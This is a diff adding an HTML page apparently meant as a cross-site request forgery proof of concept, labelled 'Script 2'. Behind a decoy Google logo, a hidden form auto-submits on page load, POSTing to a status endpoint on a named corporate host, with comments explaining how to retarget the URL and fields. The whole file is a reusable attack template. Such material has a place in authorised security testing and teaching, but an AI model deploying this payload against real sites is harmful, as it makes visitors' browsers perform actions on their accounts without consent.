@@ -1,0 +1,46 @@
+<!-- Script 2 – Script to use page with embedded hidden form, form is auto-submitted when page loads. Comments have been added where modifications are required. -->
+<html>
+	<head>
+		<script type="text/javascript">
+			function dts(data)
+			{
+				useHiddenForm();
+			}
+
+			function useHiddenForm()
+			{
+			  document.forms["hiddenform"].submit();
+			}
+
+			function toggle() 
+			{
+				var ele = document.getElementById("output");
+
+				if(ele.style.display == "block") 
+					ele.style.display = "none";
+				else 
+					ele.style.display = "block";
+			} 
+		</script>
+	</head>
+	<body onload="dts();">
+		  <div id="image">
+			<img src="http://www.google.com/images/logos/ps_logo2.png" />
+		  </div>
+		  
+		  <a id="displayText" href="javascript:toggle();">show</a>
+		  <div id="output" style="display: none"></div>
+		  
+		  <div id="hiddendiv" style="display: none">
+			 <!—
+				 Update Action attribute to point to the URL request is posted to.
+				 Create an input type of text for each value you are posting and set the value appropriately.
+				 -------------------------------- CUSTOMIZE VALUES BELOW---------------------------------------------
+			 -->
+			 <form name="hiddenform" method="POST" action="https://xyz.accenture.com/status.xml.nges?attachmentId=null&contentLength=null&contentType=null&communityId=null">
+				<input type="text" name="text" value="CSRF">
+				<input type="submit">
+			 </form>
+		  </div>
+	</body>
+</html>
